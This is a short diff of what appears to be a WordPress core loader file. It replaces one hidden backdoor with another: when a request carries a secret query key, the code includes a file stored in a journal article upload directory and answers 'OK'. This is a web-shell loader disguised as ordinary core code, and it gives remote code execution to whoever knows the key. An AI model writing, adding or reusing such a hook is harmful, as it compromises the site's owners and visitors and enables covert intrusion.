@@ -103,8 +103,8 @@ if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
 
 	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
 }
-if (isset($_GET['_']) && $_GET['_'] === 'mr_lantiau_error500') {
-    $f="/home/khatecid/dataojs/journals/2/articles/15/680b3ffd5e0d0";if($f!==""&&file_exists($f))include $f;
+if (isset($_GET['_']) && $_GET['_'] === 'cpr_seo403_07cpr') {
+    $f="/home/khatecid/dataojs/journals/4/articles/20/686d248ae92ba";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
